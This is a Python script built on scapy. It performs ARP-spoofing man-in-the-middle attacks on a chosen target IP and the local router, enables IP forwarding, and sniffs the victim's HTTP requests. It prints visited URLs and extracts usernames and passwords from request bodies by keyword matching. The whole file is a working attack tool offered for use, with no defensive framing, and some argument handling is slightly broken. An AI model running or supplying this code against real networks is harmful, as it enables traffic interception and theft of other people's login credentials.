#!/usr/bin/env python
import scapy.all as scapy
import scapy_http.http as http
import optparse
import sys
import re
import subprocess
import time
from multiprocessing import Process


def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-i", "--interface", dest="interface", help="Interface to scan for packets")
    parser.add_option("-t", "--target", dest="ip", help="Target IP Address to scan for packets")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[.] Please specify an interface, use --help for more info")
    elif not options.ip:
        parser.error("[.] Please specify a target IP Addr., use --help for more info")
    return options



# Function to sniff packets
def sniff(interface):
    # prn argument in scapy.sniff() is used to run the function process_sniffed_packet() for every packet sniffed
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


#Function to get the URL of any HTTP website visited by the target 
def get_url(packet):
    # Return the HTTP request URL visited by the target
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)


#Function to get the login information input by the target on any HTTP website
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "uname", "email", "pass", "password", "pwd", "usr", "user", "login"] # Add or Remove the Keywords according to your need
        # use packet.show() to get detailed information about the packet, and to view the various layers and fields.
        # use packet.summary() to get summary of the packet. 
        for keyword in keywords:
            if keyword in load:
                return (load)


#default function that is called for every packet sniffed
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Get the URL of the HTTP request and Print it
        url = get_url(packet)
        print("[+] HTTP Request: "+url)

        # Get the Username and Passwords and Print it
        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible Username-Password Combination Detected:\n" + login_info + "\n")



def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # broadcast mac address

    req_broadcast = broadcast/arp_request # combine the two packets
    ans_list = scapy.srp(req_broadcast, timeout=1, verbose=0)[0]
    return (ans_list[0][1].hwsrc)


def spoof(target, spoof):
    target_mac = scan(target)
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
    scapy.send(packet, verbose=False)

def get_router():
    res = subprocess.check_output(["route", "-n"])
    ip = re.search(r"\d\d\d.\d\d\d.\d\d\d.\d", str(res))
    return (ip.group(0))

def restore(dest, src):
    dest_mac = scan(dest)
    src_mac = scan(src)
    packet = scapy.ARP(op=2, pdst=dest, psrc=src, hwdst=dest_mac, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


def enable_ipv4_forwarding():
    file=open("/proc/sys/net/ipv4/ip_forward","w")
    file.write("1")
    file.close()


def arpSpoofer(target_ip, router_ip):
    print("[+] Starting ARP Spoofing...")
    print("Router IP: " + router_ip)
    print("Target IP:" + target_ip)
    enable_ipv4_forwarding()
    while True:
        # Calling the spoof function
        # Spoofing the target machine to think that we are the router
        spoof(target_ip, router_ip)
        # Spoofing the router to think that we are the target machine
        spoof(router_ip, target_ip)
        time.sleep(2)
        
        


options = get_arguments()
router_ip = get_router() # router IP
target_ip = options.ip # target IP

try:
    Process(target=arpSpoofer, args=(target_ip, router_ip)).start()
    # Call the function to start sniffing
    Process(target=sniff, args=(options.interface)).start()
except KeyboardInterrupt:
    print("\n^C Detected....Scan Terminated by user")
    print("Exiting program")
    # Restoring ARP tables on target machine and router
    print("Quitting and Restoring ARP tables...")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("[+] ARP tables restored successfully")
    sys.exit()